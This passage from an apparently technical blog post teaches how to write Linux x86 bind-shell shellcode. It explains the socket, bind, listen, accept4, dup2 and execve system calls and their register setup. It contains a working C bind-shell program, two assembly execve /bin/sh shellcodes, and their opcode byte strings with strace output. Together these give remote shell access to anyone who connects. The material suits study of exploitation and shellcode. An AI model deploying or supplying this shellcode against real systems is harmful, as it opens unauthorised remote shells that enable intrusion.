</span><span class='line'>      <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">bind_try</span><span class="p">(</span><span class="n">ai_ptr</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>          <span class="k">break</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">ai_ptr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;failed to bind&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">freeaddrinfo</span><span class="p">(</span><span class="n">ai_srv</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sl_client</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="n">sa_client</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;listen&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">fd_client</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">sa_client</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sl_client</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">fd_client</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;accept&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd_client</span><span class="p">,</span> <span class="n">STDIN_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd_client</span><span class="p">,</span> <span class="n">STDOUT_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd_client</span><span class="p">,</span> <span class="n">STDERR_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">execve</span><span class="p">(</span><span class="n">exec_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">exec_argv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;execve&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>    <span class="cm">/* NOTREACHED */</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Per the UNP book, it isn&rsquo;t mandatory to choose a port nor an address to bind to. In that case, the kernel picks an ephemeral port and uses the destination IP address of the client&rsquo;s SYN as the server&rsquo;s source IP address.</p>

<figure class='code'><figcaption><span>IPv4 socket structure</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">in_addr</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">in_addr_t</span> <span class="n">s_addr</span><span class="p">;</span>        <span class="cm">/* 32-bit IPv4 address */</span>
</span><span class='line'><span class="p">};</span> <span class="cm">/* used to be a union on 4.2BSD */</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">sa_family_t</span> <span class="n">sin_family</span><span class="p">;</span>  <span class="cm">/* 16-bit family (AF_INET) */</span>
</span><span class='line'>  <span class="kt">in_port_t</span> <span class="n">sin_port</span><span class="p">;</span>      <span class="cm">/* 16-bit port number */</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">in_addr</span> <span class="n">sin_addr</span><span class="p">;</span> <span class="cm">/* 32-bit address */</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">sin_zero</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>        <span class="cm">/* unused */</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>generic socket structure</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">sockaddr</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">sa_family</span><span class="p">;</span> <span class="cm">/* address family, AF_xxx */</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">sa_data</span><span class="p">[</span><span class="mi">14</span><span class="p">];</span>         <span class="cm">/* 14 bytes of protocol address */</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>According to <a href="http://www.kohala.com/start/">Stevens</a>, the sin_zero member was added so that all socket address structures are at least 16 bytes in size and isn&rsquo;t really required when it is going to be used with the wildcard address.</p>

<p>The socket structures are casted to the generic socket address structure, due to the functions having to deal with a multitude of protocol families (IPv4, IPv6, Unix and datalink, for instance). One could have used void from ANSI C instead of the generic structure, however that was non-existent back in 1982.</p>

<figure class='code'><figcaption><span>IPv6 socket structure</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">in6_addr</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">uint8_t</span> <span class="n">s6_addr</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>       <span class="cm">/* 128-bit IPv6 address */</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">sockaddr_in6</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">sa_family_t</span> <span class="n">sin6_family</span><span class="p">;</span>   <span class="cm">/* 16-bit family (AF_INET6) */</span>
</span><span class='line'>  <span class="kt">in_port_t</span> <span class="n">sin6_port</span><span class="p">;</span>       <span class="cm">/* 16-bit port number */</span>
</span><span class='line'>  <span class="kt">uint32_t</span> <span class="n">sin6_flowinfo</span><span class="p">;</span>    <span class="cm">/* 32-bit flow information */</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">in6_addr</span> <span class="n">sin6_addr</span><span class="p">;</span> <span class="cm">/* 128-bit address */</span>
</span><span class='line'>  <span class="kt">uint32_t</span> <span class="n">sin6_scope_id</span><span class="p">;</span>    <span class="cm">/* 32-bit scope ID */</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>The important part here is that the family struct members match, so that it can be freely accessed when casted to the generic socket structure.</p>

<figure class='code'><figcaption><span>retrieving the system call number and constants</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-syscall <span class="nb">bind</span>
</span><span class='line'><span class="c">#define __NR_bind 361</span>
</span><span class='line'>0x169
</span><span class='line'><span class="nv">$ </span>python -c <span class="s1">&#39;import socket; print socket.INADDR_ANY&#39;</span>
</span><span class='line'>0
</span></code></pre></td></tr></table></div></figure>


<pre><code>+----------+--------------------+
| register |       value        |
+----------+--------------------+
| eax      | 361                |      +---------------------------+ H
| ebx      | socket(2) fd       |      | INADDR_ANY (0)            |
| ecx      | esp pointer        +--&gt;&gt;--+ port (network byte order) |
| edx      | 16                 |      | AF_INET (2)               |
+----------+--------------------+      +---------------------------+ L
</code></pre>

<p>This is the point where <a href="http://man7.org/linux/man-pages/man2/setsockopt.2.html">setsockopt(2)</a> could be used to prevent the address is already in use error, which might occur if there are still previously established connections lying around.</p>

<p>For the <a href="http://man7.org/linux/man-pages/man2/listen.2.html">listen(2)</a> system call, according to <a href="http://pubs.opengroup.org/onlinepubs/9699919799/">SUSv4</a> a backlog argument of 0 may allow the socket to accept connections, in which case the length of the listen queue may be set to an implementation-defined minimum value. This works if SYN cookies are <a href="https://access.redhat.com/solutions/30453">enabled</a>, which is usually the case with recent versions.</p>

<figure class='code'><figcaption><span>listen(2) prototype</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">listen</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">backlog</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>retrieving the system call number</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-syscall listen
</span><span class='line'><span class="c">#define __NR_listen 363</span>
</span><span class='line'>0x16b
</span></code></pre></td></tr></table></div></figure>


<pre><code>+----------+---------------+
| register |     value     |
+----------+---------------+
| eax      | 363           |
| ebx      | socket(2) fd  |
| ecx      | 0             |
+----------+---------------+
</code></pre>

<p>Next and finally in the flow is the <a href="http://man7.org/linux/man-pages/man2/accept.2.html">accept4(2)</a> call which is used to return a completed connection from the queue, if any. On success the return value is a new file descriptor created by the kernel to be used with the recently established connection:</p>

<figure class='code'><figcaption><span>accept4(2) prototype</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">accept4</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">socklen_t</span> <span class="o">*</span><span class="n">addrlen</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>The second and third arguments are used by the kernel to fill the address structure of the newly connected peer. According to the manual page these aren&rsquo;t really needed and can be both NULL.</p>

<pre><code>+----------+---------------+
| register |     value     |
+----------+---------------+
| eax      | 364           |
| ebx      | socket(2) fd  |
| ecx      | 0             |
| edx      | 0             |
| esi      | 0             |
+----------+---------------+
| return   | new fd        |
+----------+---------------+
</code></pre>

<p>For the <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve(2)</a> system call there&rsquo;s no need to specify argv and envp, since according to the manual page on Linux, argv and envp can be specified as NULL. This is obviously <a href="http://pubs.opengroup.org/onlinepubs/9699919799/">non-standard</a> and might result in an error on other systems.</p>

<figure class='code'><figcaption><span>execve(2) prototype</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">execve</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]);</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>retrieving the system call number</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-syscall execve
</span><span class='line'><span class="c">#define __NR_execve 11</span>
</span><span class='line'>0xb
</span></code></pre></td></tr></table></div></figure>


<pre><code>+----------+-------------+
| register |    value    |
+----------+-------------+
| eax      | 11          |      +-----------+
| ebx      | esp pointer +--&gt;&gt;--+ /bin/sh\0 |
| ecx      | 0           |      +-----------+
| edx      | 0           |
+----------+-------------+
</code></pre>

<figure class='code'><figcaption><span>converting path to hex and little endian</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-string /bin/sh
</span><span class='line'>Adding <span class="m">1</span> slashes!
</span><span class='line'>Original string: /bin/sh <span class="o">(</span>7<span class="o">)</span>
</span><span class='line'>Modified string: //bin/sh <span class="o">(</span>8<span class="o">)</span>
</span><span class='line'>0x68732f6e
</span><span class='line'>0x69622f2f
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>initial execve(2) shellcode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">;</span> <span class="nf">Regular</span> <span class="no">execve</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span> <span class="no">shellcode</span> <span class="no">that</span> <span class="no">tries</span> <span class="no">to</span> <span class="no">save</span> <span class="no">as</span> <span class="no">much</span> <span class="no">space</span> <span class="no">possible</span>
</span><span class='line'><span class="err">;</span> <span class="nf">and</span> <span class="no">follow</span> <span class="no">the</span> <span class="no">specification.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'>
</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>  <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">push</span> <span class="no">eax</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="no">esp</span>    <span class="err">;</span> <span class="no">envp</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x68732f6e</span> <span class="err">;</span> <span class="no">n</span><span class="err">/</span><span class="no">sh</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x69622f2f</span> <span class="err">;</span> <span class="err">//</span><span class="no">bi</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>    <span class="err">;</span> <span class="no">filename</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">push</span> <span class="no">eax</span>
</span><span class='line'>  <span class="nf">push</span> <span class="no">ebx</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>    <span class="err">;</span> <span class="no">argv</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0xb</span>
</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-opcodes execve
</span><span class='line'>Shellcode size: 25
</span><span class='line'><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>89<span class="se">\x</span>e2<span class="se">\x</span>68<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span>cd<span class="se">\x</span>80
</span><span class='line'><span class="nv">$ </span>strace ./execve
</span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;./execve&quot;</span>, <span class="o">[</span><span class="s2">&quot;./execve&quot;</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">19</span> vars */<span class="o">])</span> <span class="o">=</span> <span class="m">0</span>
</span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;//bin/sh&quot;</span>, <span class="o">[</span><span class="s2">&quot;//bin/sh&quot;</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">0</span> vars */<span class="o">])</span> <span class="o">=</span> 0
</span></code></pre></td></tr></table></div></figure>


<p>Not specifying those arguments allows saving 4 bytes:</p>

<figure class='code'><figcaption><span>second version of execve(2) shellcode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">;</span> <span class="nf">Save</span> <span class="no">space</span> <span class="no">by</span> <span class="no">making</span> <span class="no">the</span> <span class="no">second</span> <span class="no">argument</span> <span class="no">to</span> <span class="no">execve</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="no">empty.</span> <span class="no">This</span> <span class="no">doesn</span><span class="err">&#39;</span><span class="no">t</span>
</span><span class='line'><span class="err">;</span> <span class="nf">strictly</span> <span class="no">follow</span> <span class="no">POSIX</span> <span class="no">or</span> <span class="no">SUS.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'>
</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>  <span class="nf">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>    <span class="err">;</span> <span class="no">argv</span>
</span><span class='line'>  <span class="nf">mul</span> <span class="no">ecx</span>         <span class="err">;</span> <span class="no">makes</span> <span class="no">eax</span> <span class="no">and</span> <span class="no">edx</span> <span class="p">(</span><span class="no">envp</span><span class="p">)</span> <span class="no">zero</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">push</span> <span class="no">eax</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x68732f6e</span> <span class="err">;</span> <span class="no">n</span><span class="err">/</span><span class="no">sh</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x69622f2f</span> <span class="err">;</span> <span class="err">//</span><span class="no">bi</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>    <span class="err">;</span> <span class="no">filename</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0xb</span>
</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-opcodes execve
</span><span class='line'>Shellcode size: 21
</span><span class='line'><span class="se">\x</span>31<span class="se">\x</span>c9<span class="se">\x</span>f7<span class="se">\x</span>e1<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span>cd<span class="se">\x</span>80
</span><span class='line'><span class="nv">$ </span>strace ./execve
</span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;./execve&quot;</span>, <span class="o">[</span><span class="s2">&quot;./execve&quot;</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">19</span> vars */<span class="o">])</span> <span class="o">=</span> 0
</span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;//bin/sh&quot;</span>, NULL, NULL<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The standard input, output and error file descriptors need to be redirected with <a href="http://man7.org/linux/man-pages/man2/dup.2.html">dup2(2)</a> beforehand to the recently <a href="http://man7.org/linux/man-pages/man2/accept.2.html">accept4(2)</a> file descriptor in order to have interaction with the created shell.</p>

<figure class='code'><figcaption><span>dup2(2) prototype</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">dup2</span><span class="p">(</span><span class="kt">int</span> <span class="n">fildes</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fildes2</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>retrieving the system call number</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-syscall dup2
</span><span class='line'><span class="c">#define __NR_dup2 63</span>
</span><span class='line'>0x3f
</span></code></pre></td></tr></table></div></figure>


<pre><code>+----------+---------------+
| register |     value     |
+----------+---------------+
| eax      | 63            |
| ebx      | accept4(2) fd |
| ecx      | 2, 1, 0       |
+----------+---------------+
| return   | 2, 1, 0       |
+----------+---------------+
</code></pre>

<p>In C, overall, this roughly translates to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &lt;arpa/inet.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &lt;err.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;limits.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;strings.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span>
</span><span class='line'><span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span>                    <span class="o">*</span><span class="n">exec_argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
</span><span class='line'>  <span class="kt">char</span>                    <span class="o">*</span><span class="n">endptr</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span>                      <span class="n">fd</span><span class="p">,</span> <span class="n">fd_client</span><span class="p">,</span> <span class="n">yes</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">long</span>                     <span class="n">port</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">socklen_t</span>                <span class="n">sl_client</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">sockaddr_in</span>       <span class="n">sa</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">sockaddr_storage</span>  <span class="n">sa_client</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;usage: port&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">errno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">port</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">endptr</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">endptr</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;not a number&quot;</span><span class="p">);</span>
